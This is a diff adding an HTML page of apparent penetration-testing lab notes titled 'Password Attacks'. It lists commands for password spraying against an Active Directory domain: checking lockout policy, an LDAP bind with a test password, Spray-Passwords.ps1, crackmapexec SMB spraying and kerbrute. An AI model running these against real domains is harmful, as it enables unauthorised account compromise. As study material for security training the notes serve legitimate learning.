@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Password Attacks</title>
+</head><body>net accounts<br/>
+<br/>
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br/>
+<br/>
+$PDC = ($domainObj.PdcRoleOwner).Name<br/>
+<br/>
+$SearchString = "LDAP://"<br/>
+<br/>
+$SearchString += $PDC + "/"<br/>
+<br/>
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"<br/>
+<br/>
+$SearchString += $DistinguishedName<br/>
+<br/>
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")<br/>
+<br/>
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin<br/>
+<br/>
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success<br/>
+<br/>
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com<br/>
+<br/>
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"<br/>
+<br/>
+</body></html>
